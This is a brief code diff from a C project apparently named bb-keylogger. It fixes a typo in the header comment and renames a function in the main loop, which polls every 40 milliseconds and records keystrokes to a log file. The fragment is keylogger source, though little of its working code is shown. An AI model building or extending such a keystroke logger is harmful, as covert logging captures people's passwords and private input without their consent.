@@ -1,4 +1,4 @@
-﻿/* This file is part of bb-keyloger project.
+﻿/* This file is part of bb-keylogger project.
 *
 * See the NOTICE file distributed with this work for copyright information.
 *
@@ -77,7 +77,7 @@ int main( int argc, char *argv[ ] )
 	for( ; ; )
 	{
 		Sleep( 40 );
-		log_keyboard_state( log_file );
+		log_keystrokes( log_file );
 	}
 
 }
